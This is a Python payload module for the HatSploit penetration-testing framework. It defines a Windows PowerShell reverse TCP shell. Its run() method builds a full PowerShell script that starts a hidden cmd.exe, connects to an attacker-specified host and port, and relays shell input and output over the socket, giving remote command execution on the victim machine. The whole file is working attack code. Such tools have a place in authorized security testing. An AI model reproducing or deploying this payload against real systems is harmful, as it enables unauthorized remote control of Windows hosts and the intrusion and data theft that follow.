"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *


class HatSploitPayload(Payload):
    def __init__(self):
        super().__init__({
            'Name': "Windows PowerShell Reverse TCP",
            'Payload': "windows/generic/powershell_reverse_tcp",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - payload developer',
            ],
            'Description': "Windows cmd.exe reverse TCP payload through PowerShell script.",
            'Arch': ARCH_GENERIC,
            'Platform': OS_WINDOWS,
        })

    def run(self):
        source = (
            f"$a='{self.rhost.value}';"
            f"$b={self.rport.value};"
            ""
            "$c=New-Object system.net.sockets.tcpclient;"
            "$nb=New-Object System.Byte[] $c.ReceiveBufferSize;"
            "$ob=New-Object System.Byte[] 65536;"
            "$eb=New-Object System.Byte[] 65536;"
            "$e=new-object System.Text.UTF8Encoding;"
            "$p=New-Object System.Diagnostics.Process;"
            ""
            "$p.StartInfo.FileName='cmd.exe';"
            "$p.StartInfo.RedirectStandardInput=1;"
            "$p.StartInfo.RedirectStandardOutput=1;"
            "$p.StartInfo.RedirectStandardError=1;"
            "$p.StartInfo.UseShellExecute=0;"
            "$q=$p.Start();"
            ""
            "$is=$p.StandardInput;"
            "$os=$p.StandardOutput;"
            "$es=$p.StandardError;"
            "$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);"
            "$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);"
            "$c.connect($a,$b);"
            "$s=$c.GetStream();"
            ""
            "while ($true) {"
            "    start-sleep -m 100;"
            "    if ($osread.IsCompleted -and $osread.Result -ne 0) {"
            "        $r=$os.BaseStream.EndRead($osread);"
            "        $s.Write($ob,0,$r);"
            "        $s.Flush();"
            "        $osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);"
            "    }"
            "    if ($esread.IsCompleted -and $esread.Result -ne 0) {"
            "        $r=$es.BaseStream.EndRead($esread);"
            "        $s.Write($eb,0,$r);"
            "        $s.Flush();"
            "        $esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);"
            "    }"
            "    if ($s.DataAvailable) {"
            "        $r=$s.Read($nb,0,$nb.Length);"
            "        if ($r -lt 1) {"
            "            break;"
            "        } else {"
            "            $str=$e.GetString($nb,0,$r);"
            "            $is.write($str);"
            "        }"
            "    }"
            "    if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) {"
            "        break;"
            "    }"
            "    if ($p.ExitCode -ne $null) {"
            "        break;"
            "    }"
            "}"
        )

        payload = f"powershell -w hidden -nop -c {source}"
        return payload
